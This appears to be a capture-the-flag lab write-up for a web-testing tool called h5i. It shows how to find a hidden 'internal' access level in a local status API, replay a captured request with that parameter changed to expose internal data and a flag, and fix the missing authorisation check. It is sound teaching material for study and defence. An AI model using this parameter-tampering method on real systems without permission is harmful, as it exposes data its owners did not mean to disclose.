# Lab 01 — Statuspage

## Recon

Open the page with capture on, then read what the browser actually fetched.

```bash
h5i browser open http://127.0.0.1:9010/ --session lab01 --new --capture
h5i websec requests --session lab01 --human
h5i browser markdown --session lab01
```

The page links to `/api/status?level=public`. Fetch it and read the *whole*
body, not the two rows the page renders:

```bash
h5i browser navigate http://127.0.0.1:9010/api/status?level=public --session lab01
h5i websec show res_1 --session lab01 --raw
```

```json
{"level":"public","levels":["public","internal"],"services":[…]}
```

`levels` is the finding. The server told you the name of a mode nobody links to.

## The bug

```python
rows = INTERNAL if level == "internal" else PUBLIC
```

`level` decides *how much to disclose*, and nothing decides *who may ask for
which level*. The developer treated "the UI only ever sends `public`" as a
constraint. It is not a constraint; it is a habit of one client.

## The exploit

```bash
h5i websec replay req_1 --session lab01 --set query.level=internal
h5i websec show res_2 --session lab01 --raw
```

`--set query.level=internal` rewrites one query parameter of a stored request
and sends everything else — headers, cookies, identity — unchanged. That is
what makes the result evidence: exactly one thing differed.

Confirm it mechanically rather than by eye:

```bash
h5i websec diff res_1 res_2 --session lab01 --human
h5i websec match res_2 --session lab01 --contains FLAG{ ; echo $?   # 0
```

## Why this is the first lab

Every later lab is this shape: **capture a real request, change one part of it,
compare the answers.** The `--set` target changes (`query.`, `header.`,
`cookie.`, `json.`, `form.`, `path=`, `method=`); the loop does not.

## The fix

Authorise the *caller*, not the parameter. `level=internal` should require a
session with the operator role, and the check belongs at the point of data
selection, not in the template that renders it.

## h5i technique

| Verb | What it gave you |
| --- | --- |
| `browser open --capture` | every message stored with a stable id |
| `websec requests` | what the page fetched, and its `seq` |
| `websec show res_N --raw` | the bytes, not the rendering |
| `websec replay --set query.…` | one parameter bent, nothing else |
| `websec diff` / `match` | a difference stated, not eyeballed |
